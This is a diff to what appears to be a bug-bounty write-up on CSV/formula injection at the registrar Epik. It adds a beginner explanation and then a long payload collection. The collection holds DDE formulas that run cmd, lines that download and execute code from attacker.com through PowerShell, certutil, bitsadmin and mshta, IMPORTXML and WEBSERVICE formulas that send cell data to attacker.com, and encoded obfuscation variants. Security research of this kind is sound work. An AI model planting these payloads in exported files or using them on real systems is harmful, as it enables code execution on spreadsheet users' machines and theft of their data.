@@ -5,7 +5,22 @@ categories: [Web, CSV-Injection]
 severiry: [P3 - but P2 in old exel version Enable command execution]
 tags: [csv-injection, csv, injection, formula, formula-injection, P3, RCE, fixed]
 ---
- 
+
+## What is CSV / Formula Injection?
+
+**CSV Injection (a beginner’s summary)**
+
+It’s a vulnerability that happens when a website lets you export data to a CSV or Excel file, but doesn’t clean the data first, and one of those values was typed by an attacker. The bug doesn’t fire on the website. It fires when someone opens that file in a spreadsheet program (Excel, LibreOffice, Google Sheets).
+
+#### Why it happens?
+
+Spreadsheets treat any cell that starts with certain characters as a formula, not text:
+
+= + - @
+
+So if a cell contains =1+1, Excel doesn’t show the text “=1+1” — it calculates it and shows 2. That’s the whole idea: the website saved plain text, but the spreadsheet runs it as code.
+
+
 ## Target
  
 **Epik** is a US-based domain registrar, a company where people buy, register, and manage domain names, competing with GoDaddy, Namecheap, and similar. It also offers hosting, a marketplace for buying/selling domains, and domain parking services (monetizing unused domains).
@@ -104,3 +119,64 @@ The most common and effective fix is to prefix the value with a single quote (')
 
 ### Example:
 =cmd|...  →  '=cmd|...
+
+# Payload Categories
+
+### Basic DDE Payloads:
+```
+DDE("cmd";"/C calc";"!A0")
+=cmd|' /C calc'!A0
+=cmd|' /C notepad'!'A1'
+@SUM(1+9)*cmd|' /C calc'!A0
+```
+
+### Advanced Command Execution:
+```
+=cmd|'/c whoami'!A1
+=cmd|'/c ipconfig'!A1
+=cmd|'/c net user'!A1
+=cmd|'/c wmic process call create calc'!A1
+```
+
+### Remote Code Execution (RCE):
+
+```
+=cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0
+=cmd|'/c certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe'!A0
+=cmd|'/c bitsadmin /transfer job http://attacker.com/payload.exe C:\temp\payload.exe'!A0
+=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
+=cmd|'/c mshta http://attacker.com/payload.hta'!A0
+```
+
+### HYPERLINK Exploitation:
+
+```
+=HYPERLINK("http://attacker.com","Click me")
+=HYPERLINK("file:///C:/Windows/System32/calc.exe","Click")
+@HYPERLINK("http://attacker.com?c=","Click Here")
+```
+
+### Data Exfiltration:
+
+```
+=IMPORTXML(CONCAT("http://attacker.com/?v=",A1),"//a")
+=IMPORTFEED("http://attacker.com/feed.xml")
+=WEBSERVICE("http://attacker.com")
+```
+
+### Obfuscation Techniques:
+
+```
+	=cmd|'/c calc'!A1
+	@SUM(1+1)
+	=DDE("cmd";"/C calc";"!A0")
+'=cmd|'/c calc'!A1
+'@SUM(1+1)
+'+1+1
+%3D1%2B1
+%3Dcmd%7C%27%2Fc%20calc%27%21A1
+%3DDDE%28%22cmd%22%3B%22%2FC%20calc%22%3B%22%21A0%22%29
+%0A=cmd|'/c calc'!A1
+%0D=cmd|'/c calc'!A1
+%09=cmd|'/c calc'!A1
+```
